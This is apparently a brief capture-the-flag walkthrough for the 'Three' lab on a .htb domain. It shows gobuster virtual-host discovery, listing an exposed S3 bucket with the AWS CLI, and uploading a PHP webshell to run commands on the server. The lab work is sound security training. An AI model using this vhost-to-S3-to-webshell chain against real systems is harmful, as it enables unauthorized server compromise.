# Three — Tier 0

**Concept:** AWS S3 bucket enumeration and exploitation via virtual host discovery.

## Steps

1. **Virtual host discovery** with gobuster to find subdomains:
   ```
   gobuster vhost -u http://thetoppers.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
   ```
   Discovered: `s3.thetoppers.htb`

2. **S3 bucket enumeration** — List the bucket contents:
   ```
   aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
   ```

3. **Upload a PHP webshell** to the publicly accessible bucket:
   ```
   aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb/shell.php
   ```

4. **Access the webshell** at `http://thetoppers.htb/shell.php` to execute commands on the server.

## Findings

| Field | Value |
|-------|-------|
| Target IP | `10.129.227.248` |
| Main Domain | `thetoppers.htb` |
| S3 Endpoint | `s3.thetoppers.htb` |
| Bucket Name | `thetoppers.htb` |
| Attack Vector | Virtual host enumeration -> S3 misconfiguration -> webshell upload |
